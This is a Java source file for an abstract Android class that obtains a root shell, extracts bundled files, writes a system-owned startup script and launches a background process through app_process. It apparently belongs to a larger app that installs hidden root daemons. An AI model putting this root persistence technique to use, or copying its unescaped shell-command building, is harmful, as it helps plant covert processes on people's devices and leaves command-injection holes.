package com.fx.daemon;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.HashSet;

import android.content.Context;

import com.vvt.logger.FxLog;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.Shell;
import com.vvt.shell.ShellUtil;

public abstract class Daemon {
	
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	protected static final String FORMAT_APP_PROCESS = "app_process /system/bin %s \\$* &\n";
	protected static final String FORMAT_CLASSPATH = "export CLASSPATH=%s/%s;\n";
	protected static final String FORMAT_LIBRARY = "export LD_LIBRARY_PATH=%s\n";
	
	public abstract String getStartupScriptPath();
	public abstract String getTag();
	public abstract String getProcessName();
	
	protected abstract void createStartupScript() throws Exception;
	protected abstract ArrayList<File> getExtractingFileList();
	protected abstract ArrayList<File> getRemovingFileList();
	
	/**
	 * Note: Don't forget to remount /system as read-write before start the operation
	 * @param appContext
	 * @throws InstallationException
	 */
	public void setupDaemon(Context appContext) throws InstallationException {
		if (LOGD) FxLog.d(getTag(), "setupDaemon # ENTER ...");
		
		try {
			if (LOGD) FxLog.d(getTag(), "setupDaemon # Extracting files");
			String dir = null;
			ArrayList<File> files = getExtractingFileList();
			for (File file : files) {
				dir = file.getParent();
				if (! new File(dir).exists()) {
					if (LOGD) FxLog.d(getTag(), String.format("setupDaemon # Create dir: %s", dir));
					DaemonHelper.createDirectory(dir);
				}
				DaemonHelper.enableReadWrite(dir);
				
				if (LOGD) FxLog.d(getTag(), String.format(
						"setupDaemon # Extract file: %s", file));
				extractFile(appContext, file);
			}
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(getTag(), String.format("setupDaemon # Error!! %s", e));
			throw new InstallationException();
		}
		
		if (LOGD) FxLog.d(getTag(), "setupDaemon # Create startup script");
		try {
			createStartupScript();
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(getTag(), String.format(
					"setupDaemon # Create startup script failed!! %s", e));
			throw new InstallationException();
		}
		
		if (LOGD) FxLog.d(getTag(), "setupDaemon # EXIT ...");
	}
	
	public void startDaemon() throws RunningException {
		if (LOGV) FxLog.v(getTag(), "startDaemon # ENTER ...");
		String startupScript = getStartupScriptPath();
		try {
			Shell rootShell = Shell.getRootShell();
			rootShell.exec(startupScript);
			rootShell.terminate();
		}
		catch (CannotGetRootShellException e) {
			if (LOGE) FxLog.e(getTag(), String.format("startDaemon # Error: %s", e));
			throw new RunningException();
		}
		if (LOGV) FxLog.v(getTag(), "startDaemon # EXIT ...");
	}
	
	public void stopDaemon() {
		if (LOGV) FxLog.v(getTag(), "stopDaemon # ENTER ...");
		ShellUtil.killProcessByName(getProcessName());
		if (LOGV) FxLog.v(getTag(), "stopDaemon # EXIT ...");
	}
	
	/**
	 * This method will erase almost everything that is required for 
	 * running the process, except the native library since it could be shared with others. 
	 * Note: Don't forget to remount /system as read-write before start the operation
	 */
	public void removeDaemon() throws CannotGetRootShellException {
		if (LOGV) FxLog.v(getTag(), "removeDaemon # ENTER ...");
		
		String cmd = null;
		HashSet<String> dirs = new HashSet<String>();
		
		Shell rootShell = Shell.getRootShell();
		
		if (LOGV) FxLog.v(getTag(), "removeDaemon # Remove resources");
		ArrayList<File> files = getRemovingFileList();
		for (File file : files) {
			cmd = String.format("rm %s/%s", file.getParent(), file.getName());
			if (LOGV) FxLog.v(getTag(), String.format("removeDaemon # >> %s", cmd));
			rootShell.exec(cmd);
			dirs.add(file.getParent());
		}
		
		if (LOGV) FxLog.v(getTag(), "removeDaemon # Delete directory");
		for (String dir : dirs) {
			cmd = String.format("rmdir %s", dir);
			if (LOGV) FxLog.v(getTag(), String.format("removeDaemon # >> %s", cmd));
			rootShell.exec(cmd);
		}
		
		rootShell.terminate();
		
		if (LOGV) FxLog.v(getTag(), "removeDaemon # EXIT ...");
	}

	public boolean isAvailable() {
		return ShellUtil.isProcessRunning(getProcessName());
	}
	
	protected void createStartupScriptFile(String scriptPath, String script) throws Exception {
		if (LOGV) FxLog.v(getTag(), "createStartupScriptFile # ENTER ...");
	
		Shell rootShell = Shell.getRootShell();
		
		BufferedReader reader = new BufferedReader(new StringReader(script));
		String line = null;
		while ((line = reader.readLine()) != null) {
			rootShell.exec(String.format("echo \"%s\" >> %s", line, scriptPath));
		}
		
		rootShell.exec(String.format("chown system.system %s", scriptPath));
		rootShell.exec(String.format("chmod 755 %s", scriptPath));
		rootShell.terminate();
		
		boolean isStartupScriptCreated = isStartupScriptCreated(scriptPath, script);
		if (! isStartupScriptCreated) {
			if (LOGV) FxLog.v(getTag(), 
					"createStartupScriptFile # Script is not created properly!!");
			throw new InstallationException();
		}
		
		if (LOGV) FxLog.v(getTag(), "createStartupScriptFile # EXIT ...");
	}
	
	private void extractFile(Context appContext, File file) throws InstallationException {
		
		if (LOGV) FxLog.v(getTag(), "extractFile # ENTER ...");
		
		try {
			DaemonHelper.extractAsset(appContext, file);
			if (LOGV) FxLog.v(getTag(), "extractFile # Extract done");
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(getTag(), String.format("extractFile # Extract failed!! %s", e));
			throw new InstallationException();
		}
		
		if (LOGV) FxLog.v(getTag(), "extractFile # Recheck");
		boolean isResourceExtracted = false;
		try {
			isResourceExtracted = isResourceExtracted(file);
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(getTag(), String.format("extractFile # Recheck failed!! %s", e));
		}
		if (! isResourceExtracted) {
			if (LOGV) FxLog.v(getTag(), "extractFile # Extract failed!!");
			throw new InstallationException();
		}
		
		if (LOGV) FxLog.v(getTag(), "extractFile # EXIT ...");
	}
	
	private boolean isResourceExtracted(File file)
			throws CannotGetRootShellException, IOException {
		
		if (LOGV) FxLog.v(getTag(), "isDaemonExtracted # ENTER ...");
		
		String targetPath = file.getParent();
		String filename = file.getName();
		
		if (! targetPath.trim().endsWith("/")) {
			targetPath = String.format("%s/", targetPath);
		}
		
		Shell rootShell = Shell.getRootShell();
		String output = rootShell.exec(String.format("/system/bin/ls %s*", targetPath));
		rootShell.terminate();
		
		boolean isResourceExtracted = !output.contains(Shell.NO_SUCH_FILE);
		
		if (isResourceExtracted) {
			isResourceExtracted &= output.contains(filename);
		}
		
		if (LOGV) FxLog.v(getTag(), String.format("isDaemonExtracted: %s", isResourceExtracted));
		
		if (LOGV) FxLog.v(getTag(), "isDaemonExtracted # EXIT ...");
		
		return isResourceExtracted;
	}
	
	private boolean isStartupScriptCreated(String scriptPath, String script) 
			throws CannotGetRootShellException, IOException {
		
		if (LOGV) FxLog.v(getTag(), "isStartupScriptCreated # ENTER ...");
		
		Shell rootShell = Shell.getRootShell();
		String listResult = rootShell.exec(String.format("/system/bin/ls %s", scriptPath));
		String catResult = rootShell.exec(String.format("cat %s", scriptPath));
		rootShell.terminate();
		
		String reformScript = script.replaceAll("[^\\w]","");
		if (LOGV) FxLog.v(getTag(), String.format("reformScript: %s", reformScript));
		
		String reformCatResult = catResult.replaceAll("[^\\w]","");
		if (LOGV) FxLog.v(getTag(), String.format("reformCatResult: %s", reformCatResult));
		
		boolean isStartupScriptCreated = 
			!listResult.contains(Shell.NO_SUCH_FILE) && 
			reformCatResult.contains(reformScript);
		
		if (LOGV) FxLog.v(getTag(), String.format("isStartupScriptCreated: %s", isStartupScriptCreated));
		
		if (LOGV) FxLog.v(getTag(), "isStartupScriptCreated # EXIT ...");
		
		return isStartupScriptCreated;
	}
	
}
